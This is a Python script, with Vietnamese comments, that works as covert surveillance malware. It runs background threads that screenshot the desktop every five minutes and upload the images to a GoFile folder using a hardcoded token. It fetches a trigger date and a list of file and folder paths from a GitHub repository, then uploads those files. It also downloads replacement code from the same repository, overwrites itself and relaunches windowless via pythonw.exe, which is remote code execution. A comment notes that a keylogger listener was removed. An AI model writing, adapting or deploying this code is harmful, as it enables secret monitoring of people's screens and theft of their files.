import threading
import time
import os
import sys
import pyautogui
import requests
from datetime import datetime

# --- CẤU HÌNH ---
CURRENT_VERSION = "1.0.1"
VERSION_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/version"
UPDATE_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/monitor.py"
DAY_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/day"
UPLOAD_LIST_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/upload"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
GOFILE_TOKEN = "vc5njCimJvXwoDEtsidgrTWoU9ZW61w6"
FOLDER_ID_SCREENSHOT = "f0211191-7505-4226-b5a1-cbede323189b"
UPLOAD_ENDPOINT = "https://upload.gofile.io/uploadfile"

uploaded_files = set()

def debug_log(message):
    log_path = os.path.join(BASE_DIR, "debug.log")
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} : {message}\n")
    except: pass

def upload_to_gofile(file_path, folder_id):
    if not os.path.exists(file_path): return False
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'folderId': folder_id, 'token': GOFILE_TOKEN}
            response = requests.post(UPLOAD_ENDPOINT, files=files, data=data, timeout=60)
        return response.json()['status'] == 'ok'
    except Exception as e:
        debug_log(f"Upload error ({os.path.basename(file_path)}): {e}")
        return False

# --- TỰ ĐỘNG CẬP NHẬT ---
def check_for_updates():
    while True:
        try:
            response = requests.get(VERSION_URL, timeout=15)
            if response.text.strip() != CURRENT_VERSION:
                new_code = requests.get(UPDATE_URL, timeout=15).text
                with open(__file__, "w", encoding="utf-8") as f:
                    f.write(new_code)
                os.execv(sys.executable, [sys.executable.replace("python.exe", "pythonw.exe"), __file__])
        except: pass
        time.sleep(600)

# --- CHỤP ẢNH MÀN HÌNH ---
def take_screenshot():
    while True:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"IMG_{timestamp}.png"
            full_save_path = os.path.join(BASE_DIR, filename)
            
            pyautogui.screenshot().save(full_save_path, optimize=True, quality=80)
            if upload_to_gofile(full_save_path, FOLDER_ID_SCREENSHOT):
                os.remove(full_save_path)
        except Exception as e:
            debug_log(f"Screenshot error: {e}")
        time.sleep(300)

# --- XỬ LÝ UPLOAD THEO DANH SÁCH GITHUB ---
def scheduled_upload_task():
    while True:
        try:
            # 1. Kiểm tra ngày
            target_day = requests.get(DAY_URL, timeout=15).text.strip()
            today = datetime.now().strftime("%d/%m/%Y")
            
            if target_day == today:
                # 2. Lấy danh sách file/folder cần up
                upload_list_raw = requests.get(UPLOAD_LIST_URL, timeout=15).text.strip()
                paths = [p.strip() for p in upload_list_raw.split(',') if p.strip()]
                
                for path in paths:
                    if os.path.isfile(path):
                        if path not in uploaded_files:
                            if upload_to_gofile(path, FOLDER_ID_SCREENSHOT):
                                uploaded_files.add(path)
                                debug_log(f"Đã up file: {path}")
                    
                    elif os.path.isdir(path):
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                file_full_path = os.path.join(root, file)
                                if file_full_path not in uploaded_files:
                                    if upload_to_gofile(file_full_path, FOLDER_ID_SCREENSHOT):
                                        uploaded_files.add(file_full_path)
                                        debug_log(f"Đã up file từ folder: {file_full_path}")
            
        except Exception as e:
            debug_log(f"Scheduled task error: {e}")
        
        time.sleep(900) # Kiểm tra danh sách mỗi 15 phút

if __name__ == "__main__":
    os.chdir(BASE_DIR)
    
    # Chạy các tiến trình ngầm
    threading.Thread(target=check_for_updates, daemon=True).start()
    threading.Thread(target=take_screenshot, daemon=True).start()
    threading.Thread(target=scheduled_upload_task, daemon=True).start()

    # Giữ script chạy vô hạn vì không còn keylogger listener
    while True:
        time.sleep(1)
